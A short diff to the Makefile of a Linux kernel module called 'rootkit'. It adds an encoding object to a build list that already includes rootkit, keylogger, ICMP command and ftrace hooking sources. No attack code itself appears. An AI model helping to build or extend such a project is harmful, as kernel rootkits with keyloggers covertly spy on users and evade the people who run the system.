@@ -2,7 +2,7 @@ KERNELDIR:=/lib/modules/$(shell uname -r)/build
 EXTRA_CFLAGS := -I$(src)/inc -I$(src)/lib/inc
 
 SOURCES = src/*.c
-OBJECTS = src/main.o src/icmp.o src/rootkit.o src/commands.o src/keylogger.o src/hooks.o src/drivers.o 
+OBJECTS = src/main.o src/icmp.o src/rootkit.o src/commands.o src/keylogger.o src/hooks.o src/drivers.o src/encoding.o
 OBJECTS += lib/src/ftrace_helper.o
 obj-m = rootkit.o
 rootkit-objs = $(OBJECTS)
